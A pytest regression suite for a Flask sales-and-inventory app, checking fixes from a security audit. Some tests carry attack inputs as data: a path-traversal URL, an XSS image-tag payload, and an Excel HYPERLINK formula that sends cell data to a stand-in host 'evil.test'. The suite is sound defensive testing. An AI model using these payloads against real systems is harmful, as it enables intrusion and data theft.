"""Regression tests for the 2026-10-20 security audit (claude-reports/Security-Audit/).

Each test names the finding it proves fixed.
"""

import io
import json

import pytest
from openpyxl import load_workbook
from sqlalchemy import select

from app.config import Config, ConfigError
from app.db import db
from app.models import ChatMessage, ReviewItem, Sale, SaleStatus
from app.services import pipeline, reconcile, reports, rules, stock
from app.services.inventory import Actor
from tests.test_ingest import batch, row
from tests.test_pipeline import run, sales

PW = "correct-horse-battery"


def owner(client):
    h = {"X-CSRF-Token": client.get("/api/auth/csrf").get_json()["token"]}
    client.post(
        "/api/auth/signup",
        json={"organization": "Shop", "name": "O", "email": "o@shop.test", "password": PW},
        headers=h,
    )
    return h


# ---------- configuration and HTTP hardening ----------


@pytest.mark.parametrize("value", [None, "", "prod", "Production "])
def test_config_fails_closed_without_a_known_app_env(monkeypatch, value):
    """AUTH-4 / WEB-3: anything but development/test is production or refused."""
    monkeypatch.setenv("DATABASE_URL", "postgresql+psycopg://localhost:5432/x")
    monkeypatch.delenv("SECRET_KEY", raising=False)
    if value is None:
        monkeypatch.delenv("APP_ENV", raising=False)
    else:
        monkeypatch.setenv("APP_ENV", value)
    with pytest.raises(ConfigError):
        Config()  # either "unknown APP_ENV" or "SECRET_KEY must be set in production"


def test_security_headers_and_no_store_on_api(client):
    """AUTH-8 / WEB-2."""
    r = client.get("/api/health")
    assert r.headers["Cache-Control"] == "no-store"
    assert r.headers["X-Content-Type-Options"] == "nosniff"
    assert "frame-ancestors 'none'" in r.headers["Content-Security-Policy"]
    assert r.headers["X-Frame-Options"] == "DENY"
    assert r.headers["Referrer-Policy"] == "same-origin"


def test_source_maps_and_paths_outside_dist_are_not_served(client):
    """WEB-5 / WEB-10: no .map files, and no file-existence oracle outside web/dist."""
    assert client.get("/assets/index-abc.js.map").status_code == 404
    a = client.get("/..%2f..%2fapi%2fwsgi.py")  # exists on disk
    b = client.get("/..%2f..%2fapi%2fnope.py")  # does not
    assert a.status_code == b.status_code


def test_oversized_bodies_are_refused_before_parsing(client):
    """AUTH-2 / DATA-5."""
    r = client.post(
        "/api/pair", data=json.dumps({"code": "x" * 5000}), content_type="application/json"
    )
    assert r.status_code == 413
    big = b'{"x":"' + b"a" * (9 * 1024 * 1024) + b'"}'
    h = {"X-CSRF-Token": client.get("/api/auth/csrf").get_json()["token"]}
    r = client.post("/api/auth/login", data=big, content_type="application/json", headers=h)
    assert r.status_code == 413


# ---------- pairing / login rate limits ----------


def test_pairing_attempts_are_rate_limited_and_odd_codes_are_400(client):
    """DATA-10."""
    assert client.post("/api/pair", json={"code": 12345678}).status_code == 400
    assert client.post("/api/pair", json={"code": ["A"]}).status_code == 400
    codes = [client.post("/api/pair", json={"code": "ABCD-EFGH"}).status_code for _ in range(25)]
    assert codes.count(429) >= 1 and 500 not in codes


def test_login_is_rate_limited_per_address(client):
    """AUTH-2."""
    h = {"X-CSRF-Token": client.get("/api/auth/csrf").get_json()["token"]}
    codes = [
        client.post(
            "/api/auth/login", json={"email": f"n{i}@x.test", "password": "x" * 12}, headers=h
        ).status_code
        for i in range(32)
    ]
    assert codes[-1] == 429 and 500 not in codes


# ---------- ingest ----------


def test_bad_dates_and_huge_seq_are_400_not_500(client, auth):
    """DATA-7: a 500 made the extension retry forever."""
    bad_date = batch([row(1)])
    bad_date["rows"][0]["capturedAt"] = "not-a-date"
    r = client.post("/api/ingest", json=bad_date, headers=auth)
    assert r.status_code == 400
    naive = batch([row(1)])
    naive["rows"][0]["capturedAt"] = "2026-10-19T20:00:00"
    assert client.post("/api/ingest", json=naive, headers=auth).status_code == 400
    far = batch([row(1)])
    far["rows"][0]["capturedAt"] = "0001-01-01T00:00:00Z"
    assert client.post("/api/ingest", json=far, headers=auth).status_code == 400
    big = batch([row(2**31)])
    assert client.post("/api/ingest", json=big, headers=auth).status_code == 400


def test_nul_bytes_are_stripped_and_errors_do_not_echo_chat(client, app, auth):
    """DATA-7 / EXT-2."""
    r = client.post("/api/ingest", json=batch([row(1, text="hi\x00there")]), headers=auth)
    assert r.status_code == 200
    with app.app_context():
        assert db.session.scalar(select(ChatMessage.body)) == "hithere"
    long = batch([row(2, text="<img src=x onerror=alert(1)>" + "a" * 4000)])
    r = client.post("/api/ingest", json=long, headers=auth)
    assert r.status_code == 400
    assert "<img" not in json.dumps(r.get_json())


# ---------- parser ----------


def test_a_viewer_listing_does_not_decide_the_next_win(app, world):
    """DATA-2."""
    world["say"](
        app,
        [
            ("", "Auction #1: Red bundle"),
            ("viewer1", "Now selling - Mystery item"),
            ("", "lani808 won the auction!"),
        ],
    )
    run(app, world["show"])
    assert sales(app, world["show"]) == [("lani808", "reserved", "RED", 1)]


def test_a_very_long_chat_line_does_not_stop_parsing(app, world):
    """DATA-3."""
    world["say"](
        app,
        [
            ("", "Up next: " + "x" * 400),
            ("", "lani808 won Red bundle"),
        ],
    )
    stats = run(app, world["show"])
    assert stats.parsed == 2
    assert sales(app, world["show"]) == [("lani808", "reserved", "RED", 1)]
    c = rules.classify("", "kat.c won " + "y" * 500, "")
    assert len(c.item) <= rules.ITEM_MAX


def test_sales_cannot_be_moved_backwards_without_the_ledger(app, world):
    """DATA-18."""
    world["say"](app, [("", "lani808 won Red bundle"), ("host_shop", "cancelled for lani808")])
    run(app, world["show"])
    with app.app_context():
        sale = db.session.scalar(select(Sale))
        assert sale.status is SaleStatus.cancelled
        with pytest.raises(pipeline.ReviewError):
            pipeline.set_sale_status(sale, SaleStatus.reserved, reason="x", actor=Actor())


# ---------- reconcile (money) ----------


@pytest.mark.parametrize(
    "text,cents",
    [
        ("$25.00", 2500),
        ("25", 2500),
        ("$1,234.56", 123456),
        ("$1,234", 123400),
        ("12,500", 1250000),
        ("USD 1,050", 105000),
        ("25 USD", 2500),
        ("USD25.00", 2500),
        ("CAD$ 30.00", 3000),
        ("12,50", 1250),
        ("1000,50", 100050),
        ("12,3", 1230),
        ("1.234,56", 123456),
        ("$0.07", 7),
        ("$12.345", 1235),
        ("0", 0),
        ("-5.00", None),
        ("-$5.00", None),
        ("$-5.00", None),
        ("(5.00)", None),
        ("\u22125.00", None),
        ("$.99", None),
        ("1e3", None),
        ("2 for $10", None),
        ("1 234.56", None),
        ("21474836.48", None),
        ("", None),
        ("n/a", None),
    ],
)
def test_money_parsing_handles_thousands_separators(text, cents):
    """DATA-8."""
    assert reconcile._cents(text) == cents


def test_absurd_quantities_do_not_crash_the_import():
    """DATA-8."""
    rows = reconcile.parse_csv("Buyer,Product,Quantity,Status\nlani808,Red bundle,inf,paid\n")
    assert rows[0].quantity == 1


def test_a_line_total_only_fills_the_unit_price_when_it_divides():
    """Money review #1: a Total column is per line, Sale.price_cents is per unit."""
    rows = reconcile.parse_csv(
        "Buyer,Product,Quantity,Total,Status\nbob,Card,3,$30.00,paid\nkat,Card,3,$10.00,paid\n"
    )
    assert [r.price_cents for r in rows] == [1000, None]


def test_unmatched_payment_dedupe_is_exact(app, world):
    """DATA-9: "bob" must not be hidden by an open review about "bobby"."""
    # Neither buyer has a sale: both payments are unmatched. The old LIKE check
    # ("%bob%card%") matched bobby's open review and silently dropped bob's.
    csv = "Buyer,Product,Status\nbobby,card 2,paid\nbob,card,paid\n"
    with app.app_context():
        from app.models import Show

        show = db.session.get(Show, world["show"])
        p = reconcile.plan(show, reconcile.parse_csv(csv))
        reconcile.apply(show, p, actor=Actor(), import_id="imp")
        db.session.commit()
        buyers = sorted(
            (r.proposal or {}).get("buyer")
            for r in db.session.scalars(
                select(ReviewItem).where(ReviewItem.reason == "unmatched_payment")
            )
        )
    assert "bob" in buyers


def test_two_identical_unmatched_payments_stay_two_and_reapplying_adds_nothing(app, world):
    """Money review #2 / #8."""
    csv = "Buyer,Product,Status\nbob,Mystery Pack,paid\nBob,mystery pack,paid\n"
    with app.app_context():
        from app.models import Show

        show = db.session.get(Show, world["show"])
        for imp in ("one", "two"):  # the same file applied twice
            reconcile.apply(
                show, reconcile.plan(show, reconcile.parse_csv(csv)), actor=Actor(), import_id=imp
            )
            db.session.commit()
        n = db.session.scalar(
            select(db.func.count())
            .select_from(ReviewItem)
            .where(ReviewItem.reason == "unmatched_payment")
        )
    assert n == 2


# ---------- reports ----------


def test_excel_reports_never_contain_formulas_from_chat(app, world):
    """DATA-6 / WEB-6."""
    world["say"](app, [("", 'lani808 won =HYPERLINK("https://evil.test/?"&A2,"x") for $5')])
    run(app, world["show"])
    with app.app_context():
        from app.models import Organization

        data = reports.build(db.session.get(Organization, world["org"]))
        wb = load_workbook(io.BytesIO(data))
        formulas = [
            c.coordinate
            for ws in wb.worksheets
            for r in ws.iter_rows()
            for c in r
            if c.data_type == "f"
        ]
        assert formulas == []
        texts = [c.value for ws in wb.worksheets for r in ws.iter_rows() for c in r]
        assert any(isinstance(v, str) and v.startswith("=HYPERLINK") for v in texts)


# ---------- stock / download ----------


def test_receipt_ids_cannot_contain_like_wildcards():
    """DATA-17."""
    with pytest.raises(stock.InventoryError):
        stock._client_id("abc_def_1")


def test_download_refuses_to_bake_a_host_header_url_in_production(client, app, monkeypatch):
    """DATA-14 / EXT-11."""
    owner(client)
    monkeypatch.delenv("APP_URL", raising=False)
    monkeypatch.delenv("RENDER_EXTERNAL_URL", raising=False)
    app.config["APP_ENV"] = "production"
    try:
        info = client.get("/api/extension").get_json()
        assert info["serverUrl"] is None and info["available"] is False
    finally:
        app.config["APP_ENV"] = "test"


def test_the_extension_disconnect_revokes_its_own_key(client, app, auth):
    """EXT-5: Disconnect in the extension kills the key on the server too."""
    assert client.get("/api/ingest/ping", headers=auth).status_code == 200
    assert client.post("/api/ingest/disconnect", headers=auth).status_code == 204
    assert client.get("/api/ingest/ping", headers=auth).status_code == 401


# ---------- 2026-10-31 hardening (claude-reports/Security-Efficiency-Review/) ----------


def _seed_email_failures(app, email: str, n: int = 100) -> None:
    from app.models import RateLimit
    from app.services.ratelimit import _window

    with app.app_context():
        db.session.add(RateLimit(key=f"login-fail:{email}", window_start=_window(3600), count=n))
        db.session.commit()


def test_distributed_guessing_cannot_lock_the_owner_out_of_a_known_browser(client, app):
    """#3: 100 failures from many addresses stop strangers, not the owner's own laptop."""
    from app.models import RateLimit
    from app.services import accounts

    h = owner(client)  # signing up marks this browser as known for o@shop.test
    client.post("/api/auth/logout", headers=h)
    _seed_email_failures(app, "o@shop.test")

    stranger = app.test_client()
    hs = {"X-CSRF-Token": stranger.get("/api/auth/csrf").get_json()["token"]}
    r = stranger.post(
        "/api/auth/login",
        json={"email": "o@shop.test", "password": PW},
        headers=hs,
        environ_overrides={"REMOTE_ADDR": "198.51.100.9"},
    )
    assert r.status_code == 429 and int(r.headers["Retry-After"]) > 0

    r = client.post("/api/auth/login", json={"email": "o@shop.test", "password": PW}, headers=h)
    assert r.status_code == 200

    # A tampered cookie is just a stranger.
    forged = app.test_client()
    hf = {"X-CSRF-Token": forged.get("/api/auth/csrf").get_json()["token"]}
    forged.set_cookie("wn_known", "W10.forged.sig", path="/api/auth")
    r = forged.post("/api/auth/login", json={"email": "o@shop.test", "password": PW}, headers=hf)
    assert r.status_code == 429

    # A password reset forgets every browser that signed in before it (a copied cookie
    # from a lost laptop stops helping), while the browser that did the reset is known.
    before = client.get_cookie("wn_known", path="/api/auth").value
    with app.app_context():
        token = accounts.request_password_reset("o@shop.test")
    new_pw = PW + "-new"
    r = client.post(
        "/api/auth/password/reset", json={"token": token, "password": new_pw}, headers=h
    )
    assert r.status_code == 200
    client.post("/api/auth/logout", headers=h)
    with app.app_context():
        db.session.execute(db.delete(RateLimit))
        db.session.commit()
    _seed_email_failures(app, "o@shop.test")
    stale = app.test_client()
    hst = {"X-CSRF-Token": stale.get("/api/auth/csrf").get_json()["token"]}
    stale.set_cookie("wn_known", before, path="/api/auth")
    r = stale.post(
        "/api/auth/login", json={"email": "o@shop.test", "password": new_pw}, headers=hst
    )
    assert r.status_code == 429
    r = client.post("/api/auth/login", json={"email": "o@shop.test", "password": new_pw}, headers=h)
    assert r.status_code == 200


def test_a_wrong_password_does_not_restore_the_admin(client, app, monkeypatch):
    """#21: the restore (and its session rotation) needs the right password."""
    from app.models import Role, User

    monkeypatch.setenv("ADMIN_EMAIL", "o@shop.test")
    owner(client)
    with app.app_context():
        u = db.session.scalar(select(User).where(User.email == "o@shop.test"))
        u.role, u.disabled = Role.viewer, True
        db.session.commit()
        token = u.session_token
    fresh = app.test_client()
    h = {"X-CSRF-Token": fresh.get("/api/auth/csrf").get_json()["token"]}
    r = fresh.post(
        "/api/auth/login", json={"email": "o@shop.test", "password": "x" * 12}, headers=h
    )
    assert r.status_code == 401
    with app.app_context():
        u = db.session.scalar(select(User).where(User.email == "o@shop.test"))
        assert (u.role, u.disabled, u.session_token) == (Role.viewer, True, token)
    r = fresh.post("/api/auth/login", json={"email": "o@shop.test", "password": PW}, headers=h)
    assert r.status_code == 200 and r.get_json()["user"]["role"] == "owner"


def test_non_ascii_csrf_header_is_403_not_500(client):
    """#22: compare_digest raised TypeError on non-ASCII input."""
    client.get("/api/auth/csrf")
    r = client.post(
        "/api/auth/login",
        json={"email": "a@b.co", "password": PW},
        headers={"X-CSRF-Token": "é" * 43},
    )
    assert r.status_code == 403


def test_invite_lookup_is_rate_limited(client):
    """Every unauthenticated route has a limit; the invite lookup had none."""
    codes = [client.get("/api/auth/invites/not-a-token").status_code for _ in range(32)]
    assert codes[0] == 404 and codes[-1] == 429


def test_a_huge_rows_array_is_refused_without_validating_each_row():
    """#2: 100k one-byte rows made jsonschema build 100k error objects (~350 MB)."""
    import time
    import tracemalloc

    from app.services.ingest import BatchInvalid, validate

    payload = batch([])
    payload["rows"] = [1] * 100_000
    tracemalloc.start()
    t = time.perf_counter()
    with pytest.raises(BatchInvalid) as e:
        validate(payload)
    elapsed = time.perf_counter() - t
    peak = tracemalloc.get_traced_memory()[1]
    tracemalloc.stop()
    assert "maxItems" in e.value.errors[0]
    assert elapsed < 0.5 and peak < 5 * 1024 * 1024
    with pytest.raises(BatchInvalid):
        validate(["not", "an", "object"])


def test_sheet_builder_is_linear_and_still_writes_formulas_as_text():
    """#1: the formula guard rescanned the sheet after every row (O(rows²)): 5,000 rows
    of 8 columns took ~3.9 s before, ~0.06 s after (measured locally)."""
    import time

    from openpyxl import Workbook

    rows = [
        [i, f"buyer{i}", '=HYPERLINK("http://x")' if i % 100 == 0 else "ok", i, "a", "b", "c", "d"]
        for i in range(5000)
    ]
    wb = Workbook()
    t = time.perf_counter()
    reports._sheet(wb, "T", list("ABCDEFGH"), rows, first=True)
    assert time.perf_counter() - t < 1
    ws = wb.active
    assert ws.cell(row=2, column=3).data_type == "s"  # row for i == 0
    assert ws.cell(row=2, column=3).value.startswith("=HYPERLINK")
    assert not [c for r in ws.iter_rows() for c in r if c.data_type == "f"]


def test_jobs_inline_is_refused_in_production(monkeypatch):
    """#6: inline jobs would run every parse inside a web request."""
    monkeypatch.setenv("APP_ENV", "production")
    monkeypatch.setenv("SECRET_KEY", "s" * 32)
    monkeypatch.setenv("DATABASE_URL", "postgresql+psycopg://localhost:5432/x")
    monkeypatch.setenv("JOBS_INLINE", "1")
    with pytest.raises(ConfigError, match="JOBS_INLINE"):
        Config()
    monkeypatch.delenv("JOBS_INLINE")
    Config()


def test_unhandled_errors_are_json_and_deep_json_is_400(client, monkeypatch):
    """#22: Flask's HTML 500 page for anything a route did not handle."""
    from app.services import accounts

    def boom():
        raise RuntimeError("kaboom")

    monkeypatch.setattr(accounts, "signup_state", boom)
    r = client.get("/api/auth/me")
    assert r.status_code == 500 and r.is_json and "kaboom" not in r.get_data(as_text=True)
    monkeypatch.undo()

    h = {"X-CSRF-Token": client.get("/api/auth/csrf").get_json()["token"]}
    deep = "[" * 100_000 + "]" * 100_000
    r = client.post("/api/auth/login", data=deep, content_type="application/json", headers=h)
    assert r.status_code == 400 and r.is_json
    assert client.get("/api/nope").is_json  # an /api 404 answers JSON too
    r = client.delete("/api/auth/csrf")  # 405 keeps its Allow header
    assert r.status_code == 405 and r.is_json and "GET" in r.headers["Allow"]


def test_retention_sweep_drops_only_old_bookkeeping(app):
    """#8: done jobs, finished rate-limit windows and dead tokens no longer grow forever."""
    from datetime import UTC, datetime, timedelta

    from app.models import DevicePairing, Job, JobStatus, Organization, RateLimit
    from app.services import retention

    now = datetime.now(UTC)
    with app.app_context():
        org = Organization(name="Shop", slug="shop")
        db.session.add(org)
        db.session.flush()

        def job(status, age_days):
            return Job(
                kind="parse_show",
                payload={},
                status=status,
                finished_at=now - timedelta(days=age_days),
            )

        db.session.add_all(
            [
                job(JobStatus.done, 8),
                job(JobStatus.done, 1),
                job(JobStatus.failed, 100),
                job(JobStatus.failed, 30),
                Job(kind="parse_show", payload={}, status=JobStatus.queued),
                DevicePairing(
                    organization_id=org.id,
                    name="old",
                    code_hash="a" * 64,
                    expires_at=now - timedelta(days=40),
                ),
                DevicePairing(
                    organization_id=org.id,
                    name="new",
                    code_hash="b" * 64,
                    expires_at=now + timedelta(minutes=5),
                ),
                RateLimit(key="old", window_start=now - timedelta(days=2), count=1),
                RateLimit(key="new", window_start=now, count=1),
            ]
        )
        db.session.commit()
        out = retention.sweep()
        assert out["jobs_done"] == 1 and out["jobs_failed"] == 1
        assert out["device_pairings"] == 1 and out["rate_limits"] == 1
        left = db.session.scalars(select(Job.status)).all()
        assert sorted(s.value for s in left) == ["done", "failed", "queued"]
        assert db.session.scalars(select(DevicePairing.name)).all() == ["new"]
        assert db.session.scalars(select(RateLimit.key)).all() == ["new"]


def test_a_lost_movement_race_keeps_the_callers_earlier_work(app, world, monkeypatch):
    """#10: the duplicate-source path rolled back the caller's whole transaction."""
    from app.models import InventoryMovement, MovementKind, Product, Sku
    from app.services import catalog, inventory

    with app.app_context():
        first = inventory.move(
            world["red"], MovementKind.reserve, 1, source_type="sale", source_id="42"
        )
        db.session.commit()
        first_id = first.id

    with app.app_context():
        catalog.create_product(world["org"], "Blue bundle", skus=[{"code": "BLUE"}])
        real = inventory._existing
        calls = {"n": 0}

        def blind(*a):  # miss the committed row twice, as a concurrent winner would
            calls["n"] += 1
            return None if calls["n"] <= 2 else real(*a)

        monkeypatch.setattr(inventory, "_existing", blind)
        m = inventory.move(
            world["red"], MovementKind.reserve, 1, source_type="sale", source_id="42"
        )
        assert m.id == first_id and calls["n"] == 3
        db.session.commit()

    with app.app_context():
        assert db.session.scalar(select(Product).where(Product.name == "Blue bundle"))
        red = db.session.get(Sku, world["red"])
        assert red.reserved == 1
        n = db.session.scalar(
            select(db.func.count())
            .select_from(InventoryMovement)
            .where(InventoryMovement.source_id == "42")
        )
        assert n == 1
